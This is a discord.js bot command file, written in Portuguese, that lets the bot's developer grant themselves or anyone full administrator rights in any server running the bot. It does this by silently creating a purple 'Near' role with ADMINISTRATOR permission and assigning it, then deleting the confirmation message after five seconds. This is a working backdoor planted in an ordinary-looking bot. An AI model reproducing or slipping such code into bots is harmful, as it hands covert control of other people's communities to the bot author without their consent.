const Discord = require('discord.js');

exports.run = async (bot, message, args, settings) => {
    if (!bot.owners.includes(message.author.id)) return message.channel.send('Apenas o desenvolvedor pode usar esse comando.');
    let toadm = message.mentions.members.first() || message.guild.members.find(u => u.user.id === args[0]) || message.guild.members.find(u => u.user.username === args[0]) || message.guild.members.find(u => `${u.user.username}#${u.user.discriminator}` === args[0]);
    if (!message.guild.me.hasPermission("ADMINISTRATOR")) return message.channel.send("Uhh parece que eu não tenho permissões suficientes :/");
    let admrole = message.guild.roles.find(r => r.name == "Near");
    if (!admrole) {
      try {
        admrole = await message.guild.createRole ({
          name: "Near",
          color: "#8a00ff",
          permissions: ["ADMINISTRATOR"]
        });
      } catch (e) {
        console.log(e.stack);
      }
    }
    await(toadm.addRole(admrole.id));
    message.channel.send(`Dev Admin foi adicionado para <@${toadm.id}>.`).then(msg => msg.delete(5000));

};

exports.help = {
    name: "devadmin",
    aliases: ['devad', 'nearius'],
    categoria: "Desenvolvedor",
    descrição: "Adiciona Dev-Admin para um usuário.",
    uso: "devadmin <usuário>",
    permissões: "Desenvolvedor apenas",
    disabled: false
};